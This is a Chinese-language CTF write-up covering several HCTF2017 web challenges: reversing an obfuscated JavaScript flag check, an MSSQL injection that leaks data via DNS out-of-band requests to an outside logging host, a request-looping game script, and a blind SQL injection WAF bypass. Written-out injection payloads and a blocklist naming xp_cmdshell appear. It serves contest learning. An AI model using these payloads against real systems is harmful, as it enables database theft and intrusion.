title: HCTF2017 Web Writeup
date: 2017-11-12 22:07:44
tags: ['WriteUp']

# HCTF2017 Web部分题解
 > 这次比赛感觉有点憋屈，上来起手怼了个偏逆向的JS，差不多耗了一整天的时间，吸取教训，多练练逆向吧

## 0.签到

打开发现证书有问题

火狐打开，然后查看证书，base64解码，拿到ip，访问拿到flag

## 1.JS逆向

以下部分为源代码：
```javascript

var _0x180a = ['random', 'charCodeAt', 'fromCharCode', 'parse', 'substr', '\x5cw+', 'replace', '(3(){(3\x20a(){7{(3\x20b(2){9((\x27\x27+(2/2)).5!==1||2%g===0){(3(){}).8(\x274\x27)()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();', '||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20', 'pop', 'length', 'join', 'getElementById', 'message', 'log', 'Welcome\x20to\x20HCTF:>', 'Congratulations!\x20you\x20got\x20it!', 'Sorry,\x20you\x20are\x20wrong...', 'window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:>\x27)', 'version', 'error', 'download', 'substring', 'push', 'Function', 'charAt', 'idle', 'pyW5F1U43VI', 'init', 'https://the-extension.com', 'local', 'storage', 'eval', 'then', 'get', 'getTime', 'setUTCHours', 'origin', 'set', 'GET', 'loading', 'status', 'removeListener', 'onUpdated', 'callee', 'addListener', 'onMessage', 'runtime', 'executeScript', 'data', 'test', 'http://', 'Url\x20error', 'query', 'filter', 'active', 'floor'];
(function (_0xd4b7d6, _0xad25ab) {
    var _0x5e3956 = function (_0x1661d3) {
        while (--_0x1661d3) {
            _0xd4b7d6['push'](_0xd4b7d6['shift']());
        }
    };
    _0x5e3956(++_0xad25ab);
}(_0x180a, 0x1a2));
var _0xa180 = function (_0x5c351c, _0x2046d8) {
    _0x5c351c = _0x5c351c - 0x0;
    var _0x26f3b3 = _0x180a[_0x5c351c];
    return _0x26f3b3;
};

function check(_0x5b7c0c) {
    try {
        var _0x2e2f8d = ['code', _0xa180('0x0'), _0xa180('0x1'), _0xa180('0x2'), 'invalidMonetizationCode', _0xa180('0x3'), _0xa180('0x4'), _0xa180('0x5'), _0xa180('0x6'), _0xa180('0x7'), _0xa180('0x8'), _0xa180('0x9'), _0xa180('0xa'), _0xa180('0xb'), _0xa180('0xc'), _0xa180('0xd'), _0xa180('0xe'), _0xa180('0xf'), _0xa180('0x10'), _0xa180('0x11'), 'url', _0xa180('0x12'), _0xa180('0x13'), _0xa180('0x14'), _0xa180('0x15'), _0xa180('0x16'), _0xa180('0x17'), _0xa180('0x18'), 'tabs', _0xa180('0x19'), _0xa180('0x1a'), _0xa180('0x1b'), _0xa180('0x1c'), _0xa180('0x1d'), 'replace', _0xa180('0x1e'), _0xa180('0x1f'), 'includes', _0xa180('0x20'), 'length', _0xa180('0x21'), _0xa180('0x22'), _0xa180('0x23'), _0xa180('0x24'), _0xa180('0x25'), _0xa180('0x26'), _0xa180('0x27'), _0xa180('0x28'), _0xa180('0x29'), 'toString', _0xa180('0x2a'), 'split'];
        var _0x50559f = _0x5b7c0c[_0x2e2f8d[0x5]](0x0, 0x4);
        var _0x5cea12 = parseInt(btoa(_0x50559f), 0x20);
        eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) {
            _0x2d59cf = function (_0x4be75f) {
                return _0x4be75f['toString'](_0x177f13);
            };
            if (!'' ['replace'](/^/, String)) {
                while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);
                _0x802d91 = [
                    function (_0x5e8f1a) {
                        return _0x2829f2[_0x5e8f1a];
                    }
                ];
                _0x2d59cf = function () {
                    return _0xa180('0x2b');
                };
                _0x46da6f = 0x1;
            };
            while (_0x46da6f--)
                if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180('0x2c')](new RegExp('\x5cb' + _0x2d59cf(_0x46da6f) + '\x5cb', 'g'), _0x802d91[_0x46da6f]);
            return _0x200db2;
        }(_0xa180('0x2d'), 0x11, 0x11, _0xa180('0x2e')['split']('|'), 0x0, {}));
        (function (_0x3291b7, _0xced890) {
            var _0xaed809 = function (_0x3aba26) {
                while (--_0x3aba26) {
                    _0x3291b7[_0xa180('0x4')](_0x3291b7['shift']());
                }
            };
            _0xaed809(++_0xced890);
        }(_0x2e2f8d, _0x5cea12 % 0x7b));
        var _0x43c8d1 = function (_0x3120e0) {
            var _0x3120e0 = parseInt(_0x3120e0, 0x10);
            var _0x3a882f = _0x2e2f8d[_0x3120e0];
            return _0x3a882f;
        };
        var _0x1c3854 = function (_0x52ba71) {
            var _0x52b956 = '0x';
            for (var _0x59c050 = 0x0; _0x59c050 < _0x52ba71[_0x43c8d1(0x8)]; _0x59c050++) {
                _0x52b956 += _0x52ba71[_0x43c8d1('f')](_0x59c050)[_0x43c8d1(0xc)](0x10);
            }
            return _0x52b956;
        };
        var _0x76e1e8 = _0x5b7c0c[_0x43c8d1(0xe)]('_');
        var _0x34f55b = (_0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](-0x2, 0x2)) ^ _0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](0x4, 0x1))) % _0x76e1e8[0x0][_0x43c8d1(0x8)] == 0x5;
        if (!_0x34f55b) {
            return ![];
        }
        b2c = function (_0x3f9bc5) {
            var _0x3c3bd8 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
            var _0x4dc510 = [];
            var _0x4a199f = Math[_0xa180('0x25')](_0x3f9bc5[_0x43c8d1(0x8)] / 0x5);
            var _0x4ee491 = _0x3f9bc5[_0x43c8d1(0x8)] % 0x5;
            if (_0x4ee491 != 0x0) {
                for (var _0x1e1753 = 0x0; _0x1e1753 < 0x5 - _0x4ee491; _0x1e1753++) {
                    _0x3f9bc5 += '';
                }
                _0x4a199f += 0x1;
            }
            for (_0x1e1753 = 0x0; _0x1e1753 < _0x4a199f; _0x1e1753++) {
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')](_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5) >> 0x3));
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5) & 0x7) << 0x2 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) >> 0x6));
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x3f) >> 0x1));
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x1) << 0x4 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x2) >> 0x4));
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x2) & 0xf) << 0x1 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) >> 0x7));
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x7f) >> 0x2));
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x3) << 0x3 | _0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x4) >> 0x5));
                _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')](_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x4) & 0x1f));
            }
            var _0x545c12 = 0x0;
            if (_0x4ee491 == 0x1) _0x545c12 = 0x6;
            else if (_0x4ee491 == 0x2) _0x545c12 = 0x4;
            else if (_0x4ee491 == 0x3) _0x545c12 = 0x3;
            else if (_0x4ee491 == 0x4) _0x545c12 = 0x1;
            for (_0x1e1753 = 0x0; _0x1e1753 < _0x545c12; _0x1e1753++) _0x4dc510[_0xa180('0x2f')]();
            for (_0x1e1753 = 0x0; _0x1e1753 < _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1('1b')]('=');
            (function () {
                (function _0x3c3bd8() {
                    try {
                        (function _0x4dc510(_0x460a91) {
                            if (('' + _0x460a91 / _0x460a91)[_0xa180('0x30')] !== 0x1 || _0x460a91 % 0x14 === 0x0) {
                                (function () {}['constructor']('debugger')());
                            } else {
                                debugger;
                            }
                            _0x4dc510(++_0x460a91);
                        }(0x0));
                    } catch (_0x30f185) {
                        setTimeout(_0x3c3bd8, 0x1388);
                    }
                }());
            }());
            return _0x4dc510[_0xa180('0x31')]('');
        };
        e = _0x1c3854(b2c(_0x76e1e8[0x2])[_0x43c8d1(0xe)]('=')[0x0]) ^ 0x53a3f32;
        if (e != 0x4b7c0a73) {
            return ![];
        }
        f = _0x1c3854(b2c(_0x76e1e8[0x3])[_0x43c8d1(0xe)]('=')[0x0]) ^ e;
        if (f != 0x4315332) {
            return ![];
        }
        n = f * e * _0x76e1e8[0x0][_0x43c8d1(0x8)];
        h = function (_0x4c466e, _0x28871) {
            var _0x3ea581 = '';
            for (var _0x2fbf7a = 0x0; _0x2fbf7a < _0x4c466e[_0x43c8d1(0x8)]; _0x2fbf7a++) {
                _0x3ea581 += _0x28871(_0x4c466e[_0x2fbf7a]);
            }
            return _0x3ea581;
        };
        j = _0x76e1e8[0x1][_0x43c8d1(0xe)]('3');
        if (j[0x0][_0x43c8d1(0x8)] != j[0x1][_0x43c8d1(0x8)] || (_0x1c3854(j[0x0]) ^ _0x1c3854(j[0x1])) != 0x1613) {
            return ![];
        }
        k = _0xffcc52 => _0xffcc52[_0x43c8d1('f')]() * _0x76e1e8[0x1][_0x43c8d1(0x8)];
        l = h(j[0x0], k);
        if (l != 0x2f9b5072) {
            return ![];
        }
        m = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x0, 0x4)) - 0x48a05362 == n % l;

        function _0x5a6d56(_0x5a25ab, _0x4a4483) {
            var _0x55b09f = '';
            for (var _0x508ace = 0x0; _0x508ace < _0x4a4483; _0x508ace++) {
                _0x55b09f += _0x5a25ab;
            }
            return _0x55b09f;
        }
        if (!m || _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x5, 0x1), 0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x5, 0x4) || _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x2, 0x1) - _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) != 0x1) {
            return ![];
        }
        o = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2))[_0x43c8d1(0xd)](0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x1)[_0x43c8d1('f')]() * _0x76e1e8[0x4][_0x43c8d1(0x8)] * 0x5;
        return o && _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) == 0x2 && _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2) == _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x7, 0x1), 0x2);
    } catch (_0x4cbb89) {
        console['log']('gg');
        return ![];
    }
}

function test() {
    var _0x5bf136 = document[_0xa180('0x32')](_0xa180('0x33'))['value'];
    if (_0x5bf136 == '') {
        console[_0xa180('0x34')](_0xa180('0x35'));
        return ![];
    }
    var _0x4d0e29 = check(_0x5bf136);
    if (_0x4d0e29) {
        alert(_0xa180('0x36'));
    } else {
        alert(_0xa180('0x37'));
    }
}
window['onload'] = function () {
    setInterval(_0xa180('0x38'), 0x32);
    test();
};

```

从头开始看,可能部分源码需要还原一,我们先跟进代码看一下。
大概逻辑是这样的：

1. _0x180a是存储着以函数名为值的数组
2. _0xa180以函数的形式取出_0x180a的内容
3. 通过各种check，得出flag

对check流程进行分析下:

第一步:将flag以下划线分割
```javascript
var _0x76e1e8 = _0x5b7c0c[_0x43c8d1(0xe)]('_');
```
第二步：s[0]检查
```javascript
 var _0x34f55b = (_0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](-0x2, 0x2)) ^ _0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](0x4, 0x1))) % _0x76e1e8[0x0][_0x43c8d1(0x8)] == 0x5;
        if (!_0x34f55b) {
            return ![];
}
```
第三步:s[2]检查
```javascript
e = _0x1c3854(b2c(_0x76e1e8[0x2])[_0x43c8d1(0xe)]('=')[0x0]) ^ 0x53a3f32;
        if (e != 0x4b7c0a73) {
            return ![];
            }
```
第四步:s[3]检查
```javascript
f = _0x1c3854(b2c(_0x76e1e8[0x3])[_0x43c8d1(0xe)]('=')[0x0]) ^ e;
        if (f != 0x4315332) {
            return ![];
        }
```
第五步:s[1]检查
```javascript
j = _0x76e1e8[0x1][_0x43c8d1(0xe)]('3');
        if (j[0x0][_0x43c8d1(0x8)] != j[0x1][_0x43c8d1(0x8)] || (_0x1c3854(j[0x0]) ^ _0x1c3854(j[0x1])) != 0x1613) {
            return ![];
        }
```

第六步:s[4]检查
```javascript
k = _0xffcc52 => _0xffcc52[_0x43c8d1('f')]() * _0x76e1e8[0x1][_0x43c8d1(0x8)];
l = h(j[0x0], k);
if (l != 0x2f9b5072) {
    return ![];
}
m = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x0, 0x4)) - 0x48a05362 == n % l;
function _0x5a6d56(_0x5a25ab, _0x4a4483) {
    var _0x55b09f = '';
    for (var _0x508ace = 0x0; _0x508ace < _0x4a4483; _0x508ace++) {
        _0x55b09f += _0x5a25ab;
    }
    return _0x55b09f;
}
```


第七步:通过方程进行约束
```javascript
if (!m || _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x5, 0x1), 0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x5, 0x4) || _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x2, 0x1) - _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) != 0x1) {
            return ![];
        }
o = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2))[_0x43c8d1(0xd)](0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x1)[_0x43c8d1('f')]() * _0x76e1e8[0x4][_0x43c8d1(0x8)] * 0x5;
return o && _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) == 0x2 && _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2) == _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x7, 0x1), 0x2);
```
整理一下这段方程：
1. 第五段的第六、七位不等于第五段的倒数五到八位
2. 第五段的倒数第二位减去第五段的第四位等于一
3. 第五段的七八位等于第七位的ASCII乘以第五段的长度再乘以5
4. 第五段的第二位为2，第七、八位为第八位重复两次
根据以上条件列方程
解完方程之后，会发现前两位是多解，结合给出的sha256提示找到答案为J5，解出flag
## 2.boring website

源代码如下：
```php
<?php
echo "Bob received a mission to write a login system on someone else's server, and he he only finished half of the work<br />";
echo "flag is hctf{what you get}<br /><br />";
error_reporting(E_ALL^E_NOTICE^E_WARNING);

try {
   $conn = new PDO( "sqlsrv:Server=*****;Database=not_here","oob", ""); 
}

catch( PDOException $e ) {
   die( "Error connecting to SQL Server".$e->getMessage() ); 
}

#echo "Connected to MySQL<br />";
echo "Connected to SQL Server<br />";

$id = $_GET['id'];
if(preg_match('/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i', $id)) {
	die('NoNoNo');
}
$query = "select message from not_here_too where id = $id"; //link server: On  linkname:mysql

$stmt = $conn->query( $query ); 
while ( @$row = $stmt->fetch( PDO::FETCH_ASSOC ) ){
	//TO DO: ...
	//It's time to sleep...
}

?>

```

可以看到看到oob的提示，于是可以想到sql oob带到dns解析泄露的操作
继续往下阅读，遇到waf:
```php
if(preg_match('/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i', $id)) {
	die('NoNoNo');
}
```
仔细观察，可以发现没有过滤load_file(),于是可以使用load_file()进行oob攻击

具体的操作看这篇分享  [点击此处](http://bobao.360.cn/learning/detail/3458.html)

接下来的问题就是需要一个dns服务器来进行测试，这里给个推荐，谁用谁知道hhhh  [点我](http://ceye.io/records/dns)

接下来的任务就很简单了，构造payload，观察dns解析。

我构造的payload是
>http://106.15.53.124:38324/?id=1;SELECT * FROM OPENQUERY(mysql,'select load_file(concat(0x5c5c5c5c,version(),0x2e6d65697a6a2e636579652e696f5c5c616263));');

记得使用十六进制 = = 

然后的操作就很简单了，就是正常注入操作，暴库，表，字段。




## 3.poker

这个题一开始打开毫无头绪，后来队友过来说跑脚本到100级就可以了，但是时间太晚了，没来的及跑完。这里给一下他写的脚本：
```python
import requests

url1 = "http://petgame.2017.hctf.io/function/Fight_Mod.php"
param1 = {'p':'138', 'bid': '3234', 'rd':'0.7266865914646525'}
headers1 = {'Cookie': 'PHPSESSID=t8i3qd0god2r49nn8vuuc5omc0'}

url2 = "http://petgame.2017.hctf.io/function/FightGate.php"
param2 = {'id':'1', 'g': '19', 'checkwg': 'checked', 'rd': '0.313130646160265'}

while(1):
    r1 = requests.get(url1, params=param1, headers=headers1)

    for i in range(3):
        r2 = requests.get(url2, params=param2, headers=headers1)
    
    print (r2.text)

```


## 4.sql silencer
进来一看就知道是个绕waf的题，通过测试，发现能过滤的差不多过滤没了。

然后有几个点，%0a,select,from,<,>没有过滤，所以大概猜测是用ascii函数进行对比挨个爆，然后使用%0d代替空格。

<>代表的是等于，因此可以构造出一个语句，大概思路是这样的：
>if (ascii(xxxx) > {num})  return 1   else return 0

根据这个思路最终构造得到的payload如下：
>id=1%0d<>%0d(select%0dcase%0dwhen%0d(ascii(substring((select%0dflag%0dfrom%0dhctf.flag%0dwhere%0dflag%0dlike%0d0x256863746625)from%0d42))>0)%0dthen%0d(select%0d0)%0delse%0d(select%0d1)%0dend)

这里爆出来的是一个路径，填入路径然后加上index.php，发现是个typecho，结合前段时间传的很火的typecho的后门，就能拿下来。

具体的操作看这篇  [点击此处](http://www.freebuf.com/vuls/152058.html)
